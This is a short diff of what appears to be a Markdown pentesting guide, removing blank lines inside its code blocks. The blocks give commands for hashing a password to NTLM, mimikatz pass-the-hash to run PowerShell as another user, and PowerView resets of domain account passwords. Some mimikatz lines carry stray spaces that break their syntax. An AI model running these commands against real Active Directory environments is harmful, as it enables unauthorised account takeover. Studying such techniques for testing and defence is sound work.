@@ -40,11 +40,8 @@ or using mimikatz having previously generated the NTLM hash:
 
 ```
 echo -n "password" | iconv -t UTF-16LE | openssl md4
-
 privilege :: debug
-
 token :: elevate
-
 pth /user:yourusername /domain:yourdomain / ntlm: NTLM /run:"powershell.exe"
 ```
 
@@ -54,11 +51,8 @@ Then, in an open session use PowerView.ps1 (if you need to change the password u
 
 ```
 $ SecPassword = ConvertTo-SecureString 'yourpassword' -AsPlainText -Force
-
 $ Cred = New-Object System.Management.Automation.PSCredential ('yourdomain\yourusername', $SecPassword)
-
 $ UserPassword = ConvertTo-SecureString 'yourpassword' -AsPlainText -Force
-
 Set-DomainUserPassword -Identity yourusername -AccountPassword $UserPassword -Credential $Cred
 ```
 
@@ -66,7 +60,6 @@ or (if you need to change the password without knowing the previous one, if the 
 
 ```
 $pw = Convertto-securestring 'yourpassword' -asplaintext -force
-
 Set-DomainUserPassword -Domain yourdomain -Identity 'CN=yourusername,CN=Users,DC=yourdomain,DC=yourdomain' -accountpassword $pw
 ```
 
